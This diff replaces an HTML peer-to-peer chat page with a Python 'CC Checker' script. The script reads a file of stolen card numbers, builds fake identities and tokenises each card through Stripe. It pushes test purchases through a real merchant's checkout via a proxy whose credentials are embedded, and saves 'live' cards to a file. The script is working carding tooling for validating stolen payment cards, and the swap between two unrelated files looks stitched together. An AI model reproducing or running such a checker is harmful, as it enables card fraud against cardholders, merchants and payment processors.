@@ -1,440 +1,148 @@
-✨🌺🥀
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real-Time Chat</title>
-    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-size: cover;
-            background-repeat: no-repeat;
-            min-height: 100vh;
-            margin: 0;
-            /* Updated background properties: */
-            background-color: #000; /* Black background */
-            /* Removed background-image */
-            background-position: center; /* Center the image */
-            overflow: hidden; /* Prevent scrollbars during animation */
-        }
-        .message {
-            padding: 10px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-        }
-        .sent {
-            background-color: #dcf8c6;
-            text-align: right;
-            margin-left: auto;
-        }
-        .received {
-            background-color: #f0f0f0;
-            text-align: left;
-            margin-right: auto;
-        }
-        #chat-container {
-            max-height: 400px;
-            overflow-y: auto;
-            margin-bottom: 10px;
-            border: 1px solid #e2e8f0;
-            border-radius: 0.5rem;
-            padding: 10px;
-            background-color: rgba(255, 255, 255, 0.8);
-            backdrop-filter: blur(10px);
-        }
-        .container {
-            backdrop-filter: blur(12px);
-        }
-        #login-container {
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-            padding: 2rem;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
-            max-width: 350px;
-            margin: 0 auto;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        #login-container h2{
-            color: #ffdb58;
-            text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
-            animation: fadeIn 2s ease, pulse 2s infinite alternate;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes pulse {
-          from { transform: scale(1); }
-          to { transform: scale(1.06); }
-        }
-        #wallpaper-options {
-            display: flex;
-            justify-content: center;
-            margin-top: 1rem;
-            gap: 1rem;
-        }
-        #wallpaper-options button {
-            width: 50px;
-            height: 30px;
-            border-radius: 0.25rem;
-            cursor: pointer;
-            border: none;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            transition: transform 0.2s ease-in-out;
-        }
-        #wallpaper-options button:hover {
-            transform: scale(1.1);
-        }
-        .option1 { background: linear-gradient(to bottom, #f0f2ff, #e0e7ff); }
-        .option2 { background: linear-gradient(to bottom, #e0f7fa, #c2e5ed); }
-        .option3 { background: linear-gradient(to bottom, #ffe082, #ffc107); }
-        .option4 { background: linear-gradient(to bottom, #d1c4e9, #b39ddb); }
-        .star {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background-color: #fff;
-            border-radius: 50%;
-            animation: twinkle 2s infinite;
-        }
-        @keyframes twinkle {
-            0% { opacity: 0; }
-            50% { opacity: 0.7; }
-            100% { opacity: 0; }
-        }
-        #login-button {
-            background-image: linear-gradient(to bottom right, #ffd700, #ff8c00);
-            color: black;
-            padding: 10px 20px;
-            border-radius: 0.5rem;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-            text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
-        }
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#============== Moudles ==============#
+import requests
+from requests.exceptions import ProxyError
+import json, string, re
+import os, time, random, platform, colorama
+from colorama import Fore, Back, Style
+from concurrent.futures import ThreadPoolExecutor
+colorama.init()
+#============== Moudles ==============#
+def get_email(): 
+	generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))) + '@gmail.com'
+	return generated_email.lower()
 
-        #login-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
-        }
+def get_username():  
+	generated_username = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)))
+	return generated_username.capitalize()
 
-        #login-button:active {
-            transform: scale(1);
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        input[type="text"],
-        input[type="password"] {
-            padding: 10px;
-            border-radius: 0.5rem;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            background-color: rgba(0, 0, 0, 0.8);
-            color: #fff;
-            margin-bottom: 1rem;
-            width: calc(100% - 2rem);
-            transition: all 0.3s ease;
-            outline: none;
-            backdrop-filter: blur(5px);
-        }
+def addsuccess(text):
+	success = open("Valids.txt","a")
+	success.write(text + "\n")
+	success.close()
 
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            border-color: #ffdb58;
-            box-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
-        }
+def checker(cc):
+	splitter = cc.split('|')
+	cc = splitter[0]
+	mes = splitter[1]
+	ano = splitter[2]
+	cvv = splitter[3]
+	bin = cc[:6]
 
-        #login-error {
-            color: #ff4500;
-            margin-top: 1rem;
-            font-weight: bold;
-            text-shadow: 0 0 2px #ff4500;
-        }
-        .butterfly {
-            position: absolute;
-            width: 30px;
-            height: 20px;
-            background-image: url('butterfly.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            animation: fly 4s infinite;
-            transform-origin: center;
-            pointer-events: none;
-        }
+	arr = ['http://bqqqfxeo-rotate:071h9m2354ed@p.webshare.io:80/']
 
-        @keyframes fly {
-            0% {
-                transform: translateX(0) translateY(0) rotate(0deg);
-            }
-            25% {
-                transform: translateX(50px) translateY(-30px) rotate(20deg);
-            }
-            50% {
-                transform: translateX(100px) translateY(0px) rotate(0deg);
-            }
-            75% {
-                transform: translateX(150px) translateY(20px) rotate(-20deg);
-            }
-            100% {
-                transform: translateX(200px) translateY(0px) rotate(0deg);
-            }
-        }
+	proxy = random.choice(arr)
+	proxies = { 'http' : proxy, 'https' : proxy}
+	curl =  requests.Session()
+	curl.proxies = proxies
+	res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
+	random_data = json.loads(res.text)
+	# phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
+	first_name = random_data['results'][0]['name']['first']
+	last_name = random_data['results'][0]['name']['last']
+	street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
+	city = random_data['results'][0]['location']['city']
+	state = random_data['results'][0]['location']['state']
+	zip = random_data['results'][0]['location']['postcode']
+	email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
+	password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
 
-    </style>
-</head>
-<body class="bg-gray-100 p-4">
-    <div id="login-container" class="hidden">
-        <h2 class="text-2xl font-semibold text-gray-800 mb-4">Login</h2>
-        <input type="text" id="login-username" placeholder="Username" class="border rounded-md p-2 mb-3 w-full focus:outline-none focus:ring-2 focus:ring-blue-500">
-        <input type="password" id="login-password" placeholder="Password" class="border rounded-md p-2 mb-4 w-full focus:outline-none focus:ring-2 focus:ring-blue-500">
-        <button id="login-button" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-md focus:outline-none focus:shadow-outline w-full">Login</button>
-        <p id="login-error" class="mt-2 text-red-500"></p>
-    </div>
+	lista = cc + "|" + mes + "|" + ano + "|" + cvv
 
-    <div class="container mx-auto bg-white shadow-md rounded-lg p-6" id="chat-app-container" style="display: none;">
-        <h1 class="text-2xl font-semibold text-gray-800 mb-4 text-center">Real-Time Chat</h1>
-        <div id="chat-container" class="mb-4">
-            </div>
-        <div class="flex space-x-4">
-            <input type="text" id="message-input" placeholder="Type your message..." class="flex-1 border rounded-md p-2 focus:outline-none focus:ring-2 focus:ring-blue-500">
-            <button id="send-button" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-md focus:outline-none focus:shadow-outline">Send</button>
-        </div>
-        <div class="mt-4 text-center">
-            <p id="my-id" class="text-gray-600">Your ID: </p>
-            <p id="peer-id-display" class="text-gray-600">Peer ID: </p>
-            <div class="flex space-x-2 justify-center mt-2">
-                <input type="text" id="peer-id-input" placeholder="Enter peer ID" class="border rounded-md p-2 focus:outline-none focus:ring-2 focus:ring-blue-500 w-48">
-                <button id="connect-button" class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md focus:outline-none focus:shadow-outline">Connect</button>
-            </div>
-            <p id="connection-status" class="mt-2 text-gray-700 font-medium"></p>
-        </div>
-        <div id="wallpaper-options">
-            <button class="option1"></button>
-            <button class="option2"></button>
-            <button class="option3"></button>
-            <button class="option4"></button>
-        </div>
-    </div>
+	sk_headers = {
+	"authority": "api.stripe.com",
+	"accept": "application/json",
+	"accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+	"content-type": "application/x-www-form-urlencoded",
+	"origin": "https://js.stripe.com",
+	"referer": "https://js.stripe.com/",
+	"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}
+	
+	headers = {
+	"authority": "www.diamonddjs.co.uk",
+	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
+	"accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+	"content-type": "application/x-www-form-urlencoded",
+	"cookie": "PHPSESSID=0587198944f02bad9716a53df84c750a",
+	"origin": "https://www.diamonddjs.co.uk",
+	"referer": "https://www.diamonddjs.co.uk/membership-account/membership-checkout/",
+	"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+	}
 
-    <script>
-        const chatContainer = document.getElementById('chat-container');
-        const messageInput = document.getElementById('message-input');
-        const sendButton = document.getElementById('send-button');
-        const connectButton = document.getElementById('connect-button');
-        const peerIdInput = document.getElementById('peer-id-input');
-        const myIdDisplay = document.getElementById('my-id');
-        const peerIdDisplay = document.getElementById('peer-id-display');
-        const connectionStatus = document.getElementById('connection-status');
+	data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_line1]={street}&card[address_line2]=&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip}&card[address_country]=US&card[cvc]={cvv}&card[name]={first_name}+{last_name}"
+	
+	res = curl.post("https://api.stripe.com/v1/tokens",headers=sk_headers,data=data)
+	json_first = json.loads(res.text)
+	if 'error' in json_first:
+		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
+		print(text)
+	elif 'id' not in json_first:
+		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
+		print(text)
+	else:
+		print(res.text)
+		id = json_first["id"]
+		data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&first_name={first_name}&last_name={last_name}&dj_name={first_name}&dj_city={city}&password={password}&password2={password}&bemail={email}&bconfirmemail_copy=1&fullname=&bfirstname={first_name}&blastname={last_name}&baddress1={street}&baddress2=&bcity={city}&bstate={state}&bzipcode={zip}&bcountry=US&bphone=%28225%29+368-7536&CardType=Visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&stripeToken0={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
+		
+		res = curl.post("https://www.diamonddjs.co.uk/membership-account/membership-checkout/",headers=headers,data=data)
+		
+		try:
+			if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
+				text = f"""{lista} |- RESULT: CVV LIVE [ZIP INCORRECT]"""
+				print(text) 
+				addsuccess(text);
+			elif  'Thank You For Your Payment.' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
+				text = f"""{lista} |- RESULT: APPROVED [CVV MATCH]"""
+				print(text) 
+				addsuccess(text);
+			elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
+				text = f"""{lista} |- RESULT: APPROVED [LOW BALANCE]"""
+				print(text) 
+				print(res.text)
+				addsuccess(text);                  
+			elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
+				text = f"""{lista} |- RESULT: APPROVED [CVC MISMATCH]"""
+				print(text) 
+				addsuccess(text);  
+			elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
+				text = f"""{lista} |- RESULT: APPROVED [PURCHASE NOT ALLOWED]"""
+				print(text) 
+				addsuccess(text);           
+			elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text or 'card number is incorrect' in res.text:
+				text = f"""{lista} |- RESULT: REJECTED [CARD INCORRECT]"""
+				print(text)       
+			elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
+				text = f"""{lista} |- RESULT: REJECTED [3D SECURITY]"""
+				print(text)
+			elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text:
+				text = f"""{lista} |- RESULT: REJECTED [CARD DECLINED]"""
+				print(text)
+			elif 'Do Not Honor' in res.text :
+				text = f"""{lista} |- RESULT: REJECTED [NO NOT HONOR]"""
+				print(text)
+			elif "card has expired" in res.text or 'Expired Card' in res.text:
+				text = f"""{lista} |- RESULT: REJECTED [CARD EXPIRED]"""
+				print(text)             
+			else:
+				text = f"""{lista} |- RESULT: REJECTED [UNKOWN RESPONSE]"""
+				print(text)
+				print(res.text)
+		except Exception as e:
+			print(e)
 
-        const loginContainer = document.getElementById('login-container');
-        const loginButton = document.getElementById('login-button');
-        const loginUsernameInput = document.getElementById('login-username');
-        const loginPasswordInput = document.getElementById('login-password');
-        const loginError = document.getElementById('login-error');
-        const chatAppContainer = document.getElementById('chat-app-container');
-        const wallpaperOptions = document.getElementById('wallpaper-options');
+if __name__ == '__main__':
 
-        let peer;
-        let conn;
-        let peerId;
-        let connected = false;
-        const correctUsername = "tayesh";
-        const correctPassword = "tayesh";
+	os.system('cls' if platform.system() == 'Windows' else 'clear')
+	print(Fore.RED+requests.get("http://artii.herokuapp.com/make?text=CC Checker v2").text)
+	print(Fore.GREEN+'By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder')
+	print('')
 
-        function initializePeer() {
-            try {
-                // Check if peerId is stored in localStorage
-                const storedPeerId = localStorage.getItem('peerId');
-                if (storedPeerId) {
-                    peer = new Peer(storedPeerId); // Use stored ID
-                    peerId = storedPeerId;
-                    myIdDisplay.textContent = `Your ID: ${storedPeerId}`;
-                } else {
-                    peer = new Peer(); // Generate new ID
-                    peer.on('open', id => {
-                        localStorage.setItem('peerId', id); // Store the new ID
-                        peerId = id;
-                        myIdDisplay.textContent = `Your ID: ${id}`;
-                    });
-                }
-
-
-                peer.on('connection', connection => {
-                    handleConnection(connection);
-                });
-
-                peer.on('disconnected', () => {
-                    console.log('Disconnected from PeerJS server');
-                    connectionStatus.textContent = 'Disconnected. Reconnecting...';
-                    connected = false;
-                    setTimeout(initializePeer, 5000);
-                });
-
-                peer.on('error', err => {
-                    console.error('PeerJS error:', err);
-                    connectionStatus.textContent = 'Error: ' + err.message;
-                    if (err.type === 'peer-unavailable') {
-                        connectionStatus.textContent = 'Peer unavailable. Please check the ID and try again.';
-                        connected = false;
-                        conn = null;
-                    }
-                });
-
-            } catch (error) {
-                console.error("Failed to initialize PeerJS:", error);
-                connectionStatus.textContent = "Failed to initialize connection: " + error.message;
-            }
-        }
-
-        function handleConnection(connection) {
-            conn = connection;
-            console.log('Received connection from peer:', conn.peer);
-            connectionStatus.textContent = `Connected to ${conn.peer}`;
-            peerIdDisplay.textContent = `Peer ID: ${conn.peer}`;
-            connected = true;
-            conn.on('data', data => {
-                displayMessage(data, 'received');
-            });
-            conn.on('close', () => {
-                connectionStatus.textContent = 'Connection closed.';
-                connected = false;
-                conn = null;
-            });
-            conn.on('error', err => {
-                console.error('Connection error:', err);
-                connectionStatus.textContent = 'Error: ' + err.message;
-                connected = false;
-                conn = null;
-            });
-        }
-
-
-        function connectToPeer() {
-            const peerIdToConnect = peerIdInput.value;
-            if (!peerIdToConnect) {
-                alert('Please enter a Peer ID to connect.');
-                return;
-            }
-
-            if (peerIdToConnect === peerId) {
-                alert('Cannot connect to yourself!');
-                return;
-            }
-            try {
-                conn = peer.connect(peerIdToConnect);
-                conn.on('open', () => {
-                    handleConnection(conn);
-                });
-
-                conn.on('error', err => {
-                    console.error('Connection error:', err);
-                    connectionStatus.textContent = 'Error: ' + err.message;
-                    connected = false;
-                    conn = null;
-                });
-            } catch (error) {
-                console.error("Error connecting to peer:", error);
-                connectionStatus.textContent = "Error connecting to peer: " + error.message;
-            }
-        }
-
-        function sendMessage() {
-            const message = messageInput.value;
-            if (!message || !connected) return;
-
-            conn.send(message);
-            displayMessage(message, 'sent');
-            messageInput.value = '';
-        }
-
-        function displayMessage(message, type) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `message ${type}`;
-            messageDiv.textContent = message;
-            chatContainer.appendChild(messageDiv);
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-        }
-
-        function showChatApp() {
-            loginContainer.classList.add('hidden');
-            chatAppContainer.style.display = 'block';
-            initializePeer();
-        }
-
-        function handleLogin() {
-            const username = loginUsernameInput.value;
-            const password = loginPasswordInput.value;
-
-            if (username === correctUsername && password === correctPassword) {
-                showChatApp();
-            } else {
-                loginError.textContent = "Invalid credentials. Please try again.";
-            }
-        }
-
-        loginButton.addEventListener('click', handleLogin);
-        loginPasswordInput.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter') {
-                handleLogin();
-            }
-        });
-
-        sendButton.addEventListener('click', sendMessage);
-        connectButton.addEventListener('click', connectToPeer);
-        messageInput.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter') {
-                sendMessage();
-            }
-        });
-
-        function changeBackground(option) {
-            let background = '';
-            switch (option) {
-                case 'option1':
-                    background = 'radial-gradient(circle at center, #f0f2ff 0%, #e0e7ff 70%, #d1d8f3 100%)';
-                    break;
-                case 'option2':
-                    background = 'radial-gradient(circle at center, #e0f7fa 0%, #c2e5ed 70%, #b0d8e4 100%)';
-                    break;
-                case 'option3':
-                    background = 'radial-gradient(circle at center, #ffe082 0%, #ffc107 70%, #ffb300 100%)';
-                    break;
-                 case 'option4':
-                    background = 'radial-gradient(circle at center, #d1c4e9 0%, #b39ddb 70%, #9575cd 100%)';
-                    break;
-                default:
-                    background = 'radial-gradient(circle at center, #f0f2ff 0%, #e0e7ff 70%, #d1d8f3 100%)';
-            }
-            document.body.style.background = background;
-        }
-
-        wallpaperOptions.addEventListener('click', (event) => {
-            const target = event.target;
-            if (target.tagName === 'BUTTON') {
-                changeBackground(target.className);
-            }
-        });
-
-
-        // Show login form on page load
-        window.onload = function() {
-            loginContainer.classList.remove('hidden');
-             // Create stars
-            for (let i = 0; i < 200; i++) {
-                let star = document.createElement('div');
-                star.className = 'star';
-                star.style.left = `${Math.random() * 100}vw`;
-                star.style.top = `${Math.random() * 100}vh`;
-                star.style.animationDelay = `${Math.random() * 2}s`;
-                document.body.appendChild(star);
-            }
-        };
-    </script>
-</body>
-</html>
-
+	try:
+		inpFile = input("Enter Your CC Combo File : ")
+		file = open(inpFile).readlines()
+		for lines in file:
+			line = lines.replace('\n','')
+			checker(lines)
+	except Exception as e:
+		print(e)
